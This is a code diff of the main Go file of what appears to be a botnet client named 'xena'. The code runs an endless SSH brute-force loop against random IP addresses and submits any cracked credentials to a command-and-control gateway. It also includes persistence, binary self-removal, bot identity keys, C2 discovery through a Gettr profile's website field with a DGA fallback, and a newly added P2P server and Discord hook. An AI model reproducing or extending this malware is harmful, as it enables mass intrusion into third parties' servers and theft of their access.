@@ -9,6 +9,8 @@ import (
 	"xena/gateway"
 	"xena/helpers"
 	"xena/modules"
+	"xena/networking"
+	"xena/p2p"
 	"xena/repository"
 	"xena/services"
 
@@ -24,14 +26,16 @@ var identified bool = false
 // sshCrackRoutine is an infinite loop of cracking SSH service.
 func sshCrackRoutine(gatewayHost string) {
 	for {
-		address := modules.IpRandomAddress()
-		user := modules.RandomSshUser()
-		pass := modules.RandomSshPass()
-		err := modules.SshCheck(address, user, pass, 22)
+		address := networking.IpRandomAddress()
+		user := networking.RandomSshUser()
+		pass := networking.RandomSshPass()
+
+		err := networking.SshCheck(address, user, pass, 22)
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
+
 		err = gateway.SubmitCreds(gatewayHost, gateway.Creds{
 			Ip:   address,
 			Port: 22,
@@ -65,7 +69,7 @@ func tick(host string) bool {
 	}
 
 	for _, message := range messages {
-		reply, err := gateway.InterpretMessage(host, message)
+		reply, err := gateway.InterpretMessage(message)
 		if err != nil {
 			fmt.Println(err)
 			continue
@@ -94,25 +98,23 @@ func initialize() {
 		if !modules.CheckIfPersisted() {
 			err := modules.Persist()
 			fmt.Println(err)
-			return
 		}
 	} else {
 		err := modules.RemoveBinary()
 		if err != nil {
 			fmt.Println(err)
-			return
 		}
 	}
 
 	// Initialize a SQLite database and run the migrations.
-	err := repository.Init(modules.SelfHash)
+	err := repository.DB.Init(helpers.RandomPopularWordBySeed(helpers.IntegersFromString(modules.SelfHash)))
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
 	// Check the database for details about self.
-	botDetails, err := repository.GetBotDetails()
+	botDetails, err := repository.DetailsRepo.Get()
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -127,7 +129,7 @@ func initialize() {
 		config.ID = uuid.New().String()
 
 		// Save into the database.
-		repository.InsertBotDetails(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
+		repository.DetailsRepo.Insert(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
 	} else {
 		// Load into global variables bot's details.
 		config.PrivateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
@@ -144,6 +146,18 @@ func initialize() {
 			go sshCrackRoutine(config.GatewayHost)
 		}
 	}
+
+	if config.DiscordEnabled {
+		var discord = services.Discord{}
+		err = discord.Init()
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+
+	// Start the P2P server.
+	var p2p p2p.P2P = p2p.P2P{}
+	go p2p.BootServer(config.PeerPort)
 }
 
 // prepare handles the code executed immediately.
@@ -183,12 +197,14 @@ func main() {
 		}
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
-		gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
-		if err == nil && len(gettrGatewayHost) != 0 {
-			if tick(gettrGatewayHost) {
-				// Reset the timer of DGA and move on...
-				lastContactMade = helpers.TimeSinceJesus()
-				continue
+		if len(config.GettrProfileName) != 0 {
+			gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
+			if err == nil && len(gettrGatewayHost) != 0 {
+				if tick(gettrGatewayHost) {
+					// Reset the timer of DGA and move on...
+					lastContactMade = helpers.TimeSinceJesus()
+					continue
+				}
 			}
 		}
 
